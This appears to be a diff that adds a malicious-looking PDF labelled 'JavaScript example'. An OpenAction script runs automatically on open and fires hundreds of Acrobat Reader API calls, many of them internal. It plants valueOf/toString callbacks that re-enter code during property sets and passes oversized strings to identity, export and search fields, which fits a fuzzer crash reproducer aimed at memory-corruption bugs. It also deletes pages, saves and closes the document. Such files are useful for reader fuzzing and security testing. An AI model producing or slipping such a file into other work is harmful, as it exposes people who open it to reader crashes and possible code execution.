@@ -1,0 +1,359 @@
+%PDF-1.1
+
+1 0 obj
+<<
+ /Type /Catalog
+ /Outlines 2 0 R
+ /Pages 3 0 R
+ /OpenAction 7 0 R
+>>
+endobj
+
+2 0 obj
+<<
+ /Type /Outlines
+ /Count 0
+>>
+endobj
+
+3 0 obj
+<<
+ /Type /Pages
+ /Kids [4 0 R]
+ /Count 1
+>>
+endobj
+
+4 0 obj
+<<
+ /Type /Page
+ /Parent 3 0 R
+ /MediaBox [0 0 612 792]
+ /Contents 5 0 R
+ /Resources <<
+             /ProcSet [/PDF /Text]
+             /Font << /F1 6 0 R >>
+            >>
+>>
+endobj
+
+5 0 obj
+<< /Length 56 >>
+stream
+BT /F1 12 Tf 100 700 Td 15 TL (JavaScript example) Tj ET
+endstream
+endobj
+
+6 0 obj
+<<
+ /Type /Font
+ /Subtype /Type1
+ /Name /F1
+ /BaseFont /Helvetica
+ /Encoding /MacRomanEncoding
+>>
+endobj
+
+7 0 obj
+<<
+ /Type /Action
+ /S /JavaScript
+ /JS (try{spell.available}catch(e){};
+f0=function(){try{this.app.goBack()}catch(e){};try{this.FormWorkflow.addFormWorkflowFolder()}catch(e){};try{this.Collab.createAnnotStore()}catch(e){};try{this.Collab.isOfflineReview()}catch(e){}}
+f1=function(){try{this.FormWorkflow.unregisterFormsWorkflow()}catch(e){};try{this.getPageTransition()}catch(e){};try{this.Collab.stringToUTF8()}catch(e){};try{this.numTemplates=1}catch(e){};try{this.app.fsColor=[]}catch(e){}}
+f2=function(){try{this.Collab.getFdfUrl()}catch(e){};try{this.Net.wireDump=false}catch(e){};try{this.app.mailMsg()}catch(e){};try{this.Collab.AVUMStartPayloadWrapper()}catch(e){}}
+f3=function(){try{this.Collab.getStateModels()}catch(e){};try{this.exportAsFDFStr({bAllFields:false,aFields:[Array(0xe42).join("\\x58"),""],bFlags:false,cHRef:"\\x5c\\x64\\x7b\\x35\\x7d",bBase64:false})}catch(e){};try{this.Collab.getEmailDistributionReviewServer()}catch(e){};try{this.Collab.showBasicAuditTrail=false}catch(e){};try{this.RSS.addUI()}catch(e){}}
+f4=function(){try{this.Collab.removeApprovalDocScript()}catch(e){};try{this.getOCGOrder()}catch(e){};try{this.zoomType="\\x6f\\x7e\\x3e\\x90\\x2a\\x7b\\x59"}catch(e){};try{this.app.openInPlace=false}catch(e){};try{this.app.thermometer.toString()}catch(e){}}
+f5=function(){try{this.util.scand()}catch(e){};try{this.app.fs.useTimer=false}catch(e){};try{this.Collab.getProgressInfo()}catch(e){}}
+f6=function(){try{this.exportAsFDF()}catch(e){};try{this.Collab.AVUMAddStringToPayloadWrapper()}catch(e){};try{this.disclosed=true}catch(e){}}
+f7=function(){try{this.bookmarkRoot.valueOf()}catch(e){};try{this.disclosed=false}catch(e){};try{this.Collab.bringToFront()}catch(e){};try{this.exportAsXFDFStr({cHRef:"\\x4a\\x6e\\xb1\\x68\\x2f\\x67\\x1e",bAllFields:false,aFields:"\\x50\\x3c",bFlags:true,bBase64:false,bFlags:false})}catch(e){};try{this.Collab.removeStateModel()}catch(e){}}
+f8=function(){try{this.FormWorkflow.removeMultipleSelectedFormWorkflowsInTracker()}catch(e){};try{this.app.fsUsePageTiming=true}catch(e){};try{this.getSignatureStatus()}catch(e){};try{this.identity.corporation=Array(0x68eb).join("\\u5f0e")}catch(e){};try{this.app.fs.backgroundColor={}}catch(e){}}
+f9=function(){try{this.Collab.newWrStreamToCosObj()}catch(e){};try{this.numTemplates=1}catch(e){};try{this.Collab.addDocToDocsOpenedByWizard()}catch(e){}}
+try{this.Collab.allReviewServers()}catch(e){}
+try{this.Collab.setDefaultReviewServer()}catch(e){}
+var fs0 = function(){f0();return false;}
+var os0 = {};os0.valueOf = fs0;try{this.app.toolbarHorizontal=os0}catch(e){}
+var fs1 = function(){f1();return false;}
+var os1 = {};os1.valueOf = fs1;try{this.Net.wireDump=os1}catch(e){}
+try{this.util.scand()}catch(e){}
+try{this.app.clearTimeOut()}catch(e){}
+try{this.Collab.uriConvertReviewSource()}catch(e){}
+try{this.Collab.getReviewInfo()}catch(e){}
+try{this.bookmarkRoot.valueOf()}catch(e){}
+try{this.syncAnnotScan()}catch(e){}
+try{this.app.popUpMenuEx()}catch(e){}
+try{this.Collab.getCustomEmailMessage()}catch(e){}
+try{this.app.mailMsgWithAttachment()}catch(e){}
+try{this.Collab.returnToInitiator()}catch(e){}
+try{this.Collab.takeOwnershipAndPublishComments()}catch(e){}
+try{this.Net.Subscriptions.update()}catch(e){}
+try{this.SOAP.streamDecode()}catch(e){}
+try{this.Collab.hasReviewDeadline()}catch(e){}
+try{this.openDataObject()}catch(e){}
+try{this.app.thermometer.duration=-1495.1082610951}catch(e){}
+try{this.deletePages()}catch(e){}
+try{this.viewState={}}catch(e){}
+try{this.search.docText=true}catch(e){}
+try{this.getPageRotation()}catch(e){}
+try{this.getPrintParams()}catch(e){}
+try{this.app.fs.timeDelay=-7.9521}catch(e){}
+var fs2 = function(){f2();return true;}
+var os2 = {};os2.valueOf = fs2;try{this.Collab.showBasicAuditTrail=os2}catch(e){}
+try{this.Collab.init()}catch(e){}
+try{this.Collab.getReviewError()}catch(e){}
+try{this.search.matchCase=false}catch(e){}
+try{this.app.popUpMenuEx()}catch(e){}
+try{this.annotFilter=-2804.4075}catch(e){}
+try{this.app.runtimeHighlightColor=[]}catch(e){}
+try{this.search.refine=false}catch(e){}
+try{this.saveAs()}catch(e){}
+try{this.XFAForeground=1}catch(e){}
+try{this.Collab.getAlwaysUseServer()}catch(e){}
+try{this.identity.name="\\x72\\x6d\\xe0\\x38\\x79\\xbf\\x45\\x4a\\x71"}catch(e){}
+try{this.search.getNthIndex()}catch(e){}
+try{this.spell.customDictionaryClose()}catch(e){}
+try{this.Net.stringFromStream()}catch(e){}
+try{this.spell.removeDictionary()}catch(e){}
+try{this.Net.streamEncode()}catch(e){}
+try{this.app.mailMsgWithAttachment()}catch(e){}
+try{this.app.getString()}catch(e){}
+try{this.app.measureDialog()}catch(e){}
+try{this.search.proximityRange=-8.4972711821}catch(e){}
+try{this.viewState=this.Net.Discovery}catch(e){}
+try{this.Collab.init()}catch(e){}
+try{this.Collab.getReviewFolders()}catch(e){}
+try{this.Collab.animateSyncButton()}catch(e){}
+try{this.tts.talk()}catch(e){}
+try{this.spell.addWord()}catch(e){}
+try{this.bookmarkRoot.toString()}catch(e){}
+try{this.util.spansToXML()}catch(e){}
+try{this.search.docInfo=false}catch(e){}
+try{this.info.ContactEmail="\\x5c"}catch(e){}
+try{this.getPrintParams()}catch(e){}
+try{this.Collab.defaultStore="\\u2ec0\\uc948\\ua6cd\\u09c5\\u4ab7\\ud9dd\\u7366\\u90e3\\u4bc6\\u9856"}catch(e){}
+try{this.app.calculate=false}catch(e){}
+try{this.search.matchCase=false}catch(e){}
+try{this.app.newCollection()}catch(e){}
+try{this.layout=Array(0x4622).join("\\x52")}catch(e){}
+try{this.Collab.getStateModels()}catch(e){}
+try{this.Collab.removeApprovalDocScript()}catch(e){}
+try{this.Net.streamDigest()}catch(e){}
+try{this.tts.letter()}catch(e){}
+try{this.app.measureDialog()}catch(e){}
+try{this.app.thermometer.duration=2442.8872}catch(e){}
+try{this.exportAsXFDFStr({cHRef:"\\u89ae\\u3a22\\uee6a\\u824a\\u484b",bAllFields:true,bFlags:false,bBase64:true,bFlags:true})}catch(e){}
+try{this.getPageBox()}catch(e){}
+try{this.Collab.takeOwnershipOfComments()}catch(e){}
+try{this.Collab.endInitiatorMailOperation()}catch(e){}
+var fs3 = function(){f3();return false;}
+var os3 = {};os3.valueOf = fs3;try{this.app.toolbarVertical=os3}catch(e){}
+try{this.exportAsFDF()}catch(e){}
+try{this.shareIdentity.Authenticated=true}catch(e){}
+try{this.spellDictionaryOrder=this.info}catch(e){}
+try{this.Net.streamFromString()}catch(e){}
+try{this.app.clearInterval()}catch(e){}
+try{this.Collab.showBasicAuditTrail=true}catch(e){}
+try{this.app.listToolbarButtons()}catch(e){}
+try{this.app.fsTimeDelay=1714998259.3}catch(e){}
+try{this.Collab.unsetFirstLaunch()}catch(e){}
+try{this.getDataObjectContents()}catch(e){}
+try{this.search.matchCase=true}catch(e){}
+try{this.deletePages()}catch(e){}
+try{this.Collab.maxPDFCommentsSize=14.7}catch(e){}
+try{this.Collab.takeOwnershipAndPublishComments()}catch(e){}
+var fs4 = function(){f4();return "\\uc295\\u047f\\ud7df\\uf052\\ub2b0\\u280e\\ud1e0";}
+var os4 = {};os4.valueOf = fs4;try{this.Collab.inEmailWorkflow=os4}catch(e){}
+try{this.app.fs.usePageTiming=false}catch(e){}
+try{this.viewState.toSource()}catch(e){}
+try{this.global.subscribe()}catch(e){}
+try{this.getPrintParams()}catch(e){}
+try{this.bookmarkRoot.toString()}catch(e){}
+try{this.getNthFieldName()}catch(e){}
+try{this.spell.checkText()}catch(e){}
+try{this.permStatusReady=1}catch(e){}
+try{this.getPageLabel()}catch(e){}
+try{this.search.bookmarks=false}catch(e){}
+try{this.Collab.privateAnnotsAllowed=true}catch(e){}
+try{this.Collab.takeOwnershipOfComments()}catch(e){}
+try{this.Collab.getStoreFSBased()}catch(e){}
+try{this.tts.speechRate=-11.6}catch(e){}
+try{this.Collab.AVUMEndPayloadWrapper()}catch(e){}
+try{this.exportAsFDFStr({bAllFields:0,bNoPassword:false,aFields:3,bFlags:false,cHRef:"\\xc4\\x62\\x51",bBase64:false})}catch(e){}
+try{this.Collab.AVUMStartPayloadWrapper()}catch(e){}
+try{this.tts.volume=2222.2763}catch(e){}
+try{this.getPrintSepsParams()}catch(e){}
+try{this.search.wordMatching="\\x77\\x43\\x55\\x5f\\x7b\\x44\\x25"}catch(e){}
+try{this.exportAsText()}catch(e){}
+var fs5 = function(){f5();return 0.81926;}
+var os5 = {};os5.valueOf = fs5;try{this.Collab.maxPDFCommentsSize=os5}catch(e){}
+try{this.Net.streamDigest()}catch(e){}
+try{this.search.bookmarks=false}catch(e){}
+try{this.exportAsXFAStr()}catch(e){}
+try{this.Collab.lastBBRURL="\\x2f\\x43\\x2f\\x55\\x73\\x65\\x72\\x73\\x2f\\x77\\x78\\x79\\x2f\\x44\\x65\\x73\\x6b\\x74\\x6f\\x70\\x2f\\x74\\x72\\x75\\x73\\x74\\x2f\\x67\\x65\\x74\\x73\\x74\\x72\\x2e\\x70\\x64\\x66"}catch(e){}
+try{this.exportAsXFDFStr({cHRef:"\\x6b",bNoPassword:true,aFields:Array(0x6d).join("\\x59"),bFlags:false})}catch(e){}
+try{this.util.printd()}catch(e){}
+try{this.search.ignoreAccents=true}catch(e){}
+try{this.getDataObject()}catch(e){}
+try{this.app.fsCursor=1537812775.2823}catch(e){}
+try{this.shareIdentity.Authenticated=false}catch(e){}
+try{this.addAnnot()}catch(e){}
+try{this.wireframe=false}catch(e){}
+try{this.search.removeIndex()}catch(e){}
+try{this.app.thermometer.begin()}catch(e){}
+try{this.RSS.update()}catch(e){}
+try{this.app.toolbarVertical=true}catch(e){}
+try{this.Collab.AVUMStartPayloadWrapper()}catch(e){}
+try{this.app.focusRect=true}catch(e){}
+try{this.spell.userWords()}catch(e){}
+try{this.disclosed=false}catch(e){}
+try{this.getPageTransition()}catch(e){}
+try{this.Collab.setStoreSettings()}catch(e){}
+try{this.pageNum=-10.0392759071}catch(e){}
+try{this.Net.streamEncode()}catch(e){}
+try{this.addNewField()}catch(e){}
+try{this.app.thermometer.value=-4.0}catch(e){}
+try{this.resetForm()}catch(e){}
+try{this.Collab.privateAnnotsAllowed=false}catch(e){}
+try{this.Collab.uriNormalize()}catch(e){}
+try{this.Collab.removeDocsOpenedByWizard()}catch(e){}
+try{this.Collab.setStoreSettings()}catch(e){}
+try{this.exportAsFDFStr({bAllFields:true,bNoPassword:true,aFields:["\\uf47c\\uca54\\u65eb",Array(0x5b22).join("\\x76"),"\\uefaa\\ue47d\\ub6ff\\u5e7d\\u84ab\\u382b","\\x6a\\x25\\x7d\\x76\\x68\\x4b\\x7e\\x71"],bFlags:false,cHRef:"\\x2f\\x65\\x4b\\x6d\\xcd\\x63\\x86\\x08"})}catch(e){}
+var fs6 = function(){f6();return "\\x57\\x69\\x70\\x65\\x52\\x69\\x67\\x68\\x74\\x55\\x70";}
+var os6 = {};os6.toString = fs6;try{this.search.wordMatching=os6}catch(e){}
+try{this.search.removeIndex()}catch(e){}
+try{this.shareIdentity.FullName="\\x98\\xa9\\x33\\xda\\x5f\\x20"}catch(e){}
+try{this.app.listToolbarButtons()}catch(e){}
+try{this.search.ignoreAccents=true}catch(e){}
+try{this.identity.email=Array(0xd56).join("\\x5b")}catch(e){}
+try{this.Collab.setReviewRespondedDate()}catch(e){}
+try{this.Collab.removeReviewFolder()}catch(e){}
+try{this.getNthFieldName()}catch(e){}
+try{this.getPageLabel()}catch(e){}
+try{this.tts.punctuations=Array(0x7c5).join("\\x68")}catch(e){}
+try{this.app.hideToolbarButton()}catch(e){}
+try{this.search.matchCase=false}catch(e){}
+try{this.Collab.unregisterReview()}catch(e){}
+try{this.tts.soundCues=true}catch(e){}
+try{this.dynamicXFAForm=1}catch(e){}
+try{this.SOAP.streamDigest()}catch(e){}
+try{this.Collab.getStoreFSBased()}catch(e){}
+try{this.app.fs.clickAdvances=true}catch(e){}
+try{this.app.mailMsg()}catch(e){}
+try{this.app.fs.escapeExits=true}catch(e){}
+try{this.Collab.animateSyncButton()}catch(e){}
+try{this.Collab.stream2CosObj()}catch(e){}
+try{this.info.Authors=[]}catch(e){}
+try{this.dynamicXFAForm=1}catch(e){}
+try{this.util.spansToXML()}catch(e){}
+try{this.app.newCollection()}catch(e){}
+try{this.spell.addDictionary()}catch(e){}
+try{this.Collab.enableFinalApprovalEmail()}catch(e){}
+try{this.search.docText=false}catch(e){}
+try{this.viewState=2}catch(e){}
+try{this.getNthIconName()}catch(e){}
+try{this.Collab.uriEncode()}catch(e){}
+try{this.Collab.getStateModels()}catch(e){}
+try{this.tts.pitch=13.70942}catch(e){}
+try{this.SOAP.streamFromString()}catch(e){}
+var fs7 = function(){f7();return false;}
+var os7 = {};os7.valueOf = fs7;try{this.search.matchWholeWord=os7}catch(e){}
+try{this.app.beginPriv()}catch(e){}
+try{this.Collab.isOfflineReview()}catch(e){}
+try{this.search.docText=false}catch(e){}
+var fs8 = function(){f8();return true;}
+var os8 = {};os8.valueOf = fs8;try{this.app.openInPlace=os8}catch(e){}
+try{this.dirty=false}catch(e){}
+try{this.SOAP.wireDump=false}catch(e){}
+try{this.app.focusRect=true}catch(e){}
+try{this.app.toolbarHorizontal=false}catch(e){}
+try{this.tts.qTone()}catch(e){}
+try{this.search.attachments=true}catch(e){}
+try{this.tts.pitch=-3.092}catch(e){}
+try{this.Collab.removeReviewFolder()}catch(e){}
+try{this.enableWindows()}catch(e){}
+try{this.app.setInterval()}catch(e){}
+try{this.app.getNthPlugInName()}catch(e){}
+try{this.Collab.maxPDFCommentsSize=1}catch(e){}
+try{this.app.getPath()}catch(e){}
+try{this.util.printx()}catch(e){}
+try{this.getPageBox()}catch(e){}
+try{this.permStatusReady=5}catch(e){}
+try{this.global.setPersistent()}catch(e){}
+try{this.app.thermometer.text=false}catch(e){}
+try{this.Collab.removeDocsOpenedByWizard()}catch(e){}
+try{this.Collab.registerReview()}catch(e){}
+try{this.getPageBox()}catch(e){}
+try{this.app.fs.usePageTiming=false}catch(e){}
+try{this.app.clearInterval()}catch(e){}
+try{this.Collab.uriConvertReviewSource()}catch(e){}
+try{this.util.stringFromStream()}catch(e){}
+try{this.search.refine=false}catch(e){}
+try{this.RSS.update()}catch(e){}
+try{this.Net.streamFromString()}catch(e){}
+try{this.util.stringFromStream()}catch(e){}
+try{this.Collab.getNumberOfReviewsOnServer()}catch(e){}
+try{this.viewState.toSource()}catch(e){}
+try{this.exportAsText()}catch(e){}
+var fs9 = function(){f9();return false;}
+var os9 = {};os9.valueOf = fs9;try{this.dirty=os9}catch(e){}
+try{this.Collab.bringToFront()}catch(e){}
+try{this.app.goBack()}catch(e){}
+try{this.Collab.registerProxy()}catch(e){}
+try{this.tts.qTone()}catch(e){}
+try{this.search.ignoreAsianCharacterWidth=false}catch(e){}
+try{this.app.getString()}catch(e){}
+try{this.app.fs.timeDelay=2589.51}catch(e){}
+try{this.getAnnot()}catch(e){}
+try{this.saveAs()}catch(e){}
+try{this.Collab.privateAnnotsAllowed=true}catch(e){}
+try{this.app.thermometer.begin()}catch(e){}
+try{this.calculateNow()}catch(e){}
+try{this.Net.Subscriptions.addUI()}catch(e){}
+try{this.Collab.lastBBRURL="\\x9e"}catch(e){}
+try{this.zoom=-12.3}catch(e){}
+try{this.info.ContactEmail="\\x43\\x89\\x03\\x76\\x6a\\x52\\x73\\x64"}catch(e){}
+try{this.info.Authors=[]}catch(e){}
+try{this.exportAsText()}catch(e){}
+try{this.Collab.isFirstLaunch()}catch(e){}
+try{this.Collab.collapseTrackerSelection()}catch(e){}
+try{this.spellDictionaryOrder=[]}catch(e){}
+try{this.Collab.uriToDIPath()}catch(e){}
+try{this.Collab.isApprovalWorkflow()}catch(e){}
+try{this.Collab.getServiceURL()}catch(e){}
+try{this.shareIdentity.Corporation="\\u00dd\\u6226\\u3a8f"}catch(e){}
+try{this.search.bookmarks=false}catch(e){}
+try{this.tts.reset()}catch(e){}
+try{this.FormWorkflow.setFormFolderForMultipleForms()}catch(e){}
+try{this.app.loadPolicyFile()}catch(e){}
+try{this.app.toolbarHorizontal=true}catch(e){}
+try{this.getField()}catch(e){}
+try{this.FormWorkflow.setFormFolderForMultipleForms()}catch(e){}
+try{this.spell.customDictionaryClose()}catch(e){}
+try{this.getOCGOrder()}catch(e){}
+try{this.exportAsText()}catch(e){}
+try{this.search.ignoreAsianCharacterWidth=false}catch(e){}
+try{this.disableWindows()}catch(e){}
+try{this.Net.Subscriptions.update()}catch(e){}
+try{this.Collab.getReviewFolder()}catch(e){}
+closeDoc(1);)
+>>
+endobj
+
+xref
+0 8
+0000000000 65535 f
+0000000012 00000 n
+0000000109 00000 n
+0000000165 00000 n
+0000000234 00000 n
+0000000439 00000 n
+0000000553 00000 n
+0000000677 00000 n
+trailer
+<<
+ /Size 8
+ /Root 1 0 R
+>>
+startxref
+16045
+%%EOF
